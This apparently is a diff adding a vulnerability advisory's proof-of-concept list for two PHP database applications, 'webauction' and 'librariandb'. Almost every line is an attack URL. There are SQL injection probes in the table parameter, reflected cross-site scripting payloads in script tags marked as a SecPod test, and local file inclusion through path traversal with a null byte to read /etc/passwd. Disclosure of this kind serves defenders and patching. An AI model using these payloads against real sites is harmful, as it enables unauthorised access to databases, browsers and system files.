@@ -1,0 +1,36 @@
+
+SQL Injection Vulnerabilities:
+ 
+http://www.example.com/webauction/index.php?-table=%27
+http://www.example.com/webauction/index.php?-action=list&-table=%27
+http://www.example.com/librariandb/index.php?-table=%27
+http://www.example.com/librariandb/index.php?-action=list&-table=%27
+ 
+
+Cross Site Scripting Vulnerabilities:
+ 
+http://www.example.com/webauction/index.php?-action=list&-table=%3Cscript%3Ealert
+%28%22SecPod-XSS-TEST%22%29%3C/script%3E
+ 
+http://www.example.com/webauction/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=%27%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C/script%3E
+Vist : http://www.example.com/webauction/index.php to see execut injected code
+ 
+http://www.example.com/librariandb/index.php?-action=list&-table=%3Cscript%3Ealert%28
+%22SecPod-XSS-TEST%22%29%3C/script%3E
+ 
+http://www.example.com/librariandb/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=%27%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C/script%3E
+ 
+Local File Inclusion Vulnerability:
+ 
+http://www.example.com/webauction/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
+Vist : http://www.example.com/webauction/index.php to see the content of "/etc/passwd"
+file
+ 
+ 
+http://www.example.com/librariandb/index.php?-table=books&-action=browse_by_cat&-cursor
+=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
